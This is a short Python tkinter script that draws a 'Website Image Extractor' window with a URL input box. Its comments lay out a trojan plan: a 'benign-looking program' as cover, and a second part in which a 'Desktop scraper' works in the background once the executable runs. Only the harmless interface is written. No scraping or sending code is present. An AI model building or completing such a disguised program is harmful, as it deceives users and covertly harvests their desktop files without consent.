# part 1: Write a benign-looking program, such as image extractor from a website 
#         which the user inputs. Ask to choose a folder within the system using a 
#         pop-up file explorer. 
import tkinter as tk
from tkinter import filedialog as fd

# window
window = tk.Tk()
window.title("Website Image Extractor")
window.geometry('400x200')


# widgets
urlLabel = tk.Label(text="Website to extract images from:")
urlLabel.pack()
urlTextbox = tk.Text(window, height = 1, width = 20)
urlTextbox.pack()

# loop
window.mainloop()


# part 2: When the executable is ran, have Desktop scraper in the background working